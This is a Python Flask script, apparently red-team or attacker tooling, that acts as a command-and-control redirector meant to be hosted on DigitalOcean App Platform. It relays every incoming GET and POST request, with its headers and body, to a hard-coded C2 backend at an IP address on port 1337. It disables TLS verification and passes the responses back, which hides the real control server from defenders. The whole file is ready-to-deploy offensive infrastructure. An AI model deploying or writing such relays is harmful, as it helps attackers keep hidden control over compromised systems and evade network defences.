from flask import Flask, request, Response
import requests
from urllib.parse import unquote
import logging

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

# Change this to your real C2 server address
C2_BACKEND = "http://44.202.81.220:1337"
TIMEOUT = 10  # seconds for backend timeout

# Health check endpoint for DO App Platform
@app.route('/health', methods=['GET'])
def health_check():
    return 'OK', 200

# Log each incoming request
@app.before_request
def log_request_info():
    print(f"[+] Incoming: {request.remote_addr} - {request.method} {request.url}")
    print(f"[+] Headers: {dict(request.headers)}")

@app.route('/', defaults={'path': ''}, methods=["GET", "POST"])
@app.route('/<path:path>', methods=["GET", "POST"])
def redirector(path):
    try:
        # Decode path (e.g., /api%2Fv2 → /api/v2)
        decoded_path = unquote(path)
        url = f"{C2_BACKEND}/{decoded_path}"

        # Forward headers, but remove 'Host' to prevent backend rejection
        headers = {
            key: value for key, value in request.headers
            if key.lower() != 'host'
        }

        # Reuse method and forward request
        if request.method == 'GET':
            resp = requests.get(url, headers=headers, params=request.args, verify=False, timeout=TIMEOUT)
        elif request.method == 'POST':
            resp = requests.post(url, headers=headers, data=request.get_data(), verify=False, timeout=TIMEOUT)
        else:
            return "[!] Unsupported method", 405

        # Clean response headers
        excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
        response_headers = [
            (name, value) for name, value in resp.raw.headers.items()
            if name.lower() not in excluded_headers
        ]

        return Response(resp.content, resp.status_code, response_headers)

    except Exception as e:
        print(f"[!] Redirector error: {str(e)}")
        return f"[!] Redirector error: {str(e)}", 502

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
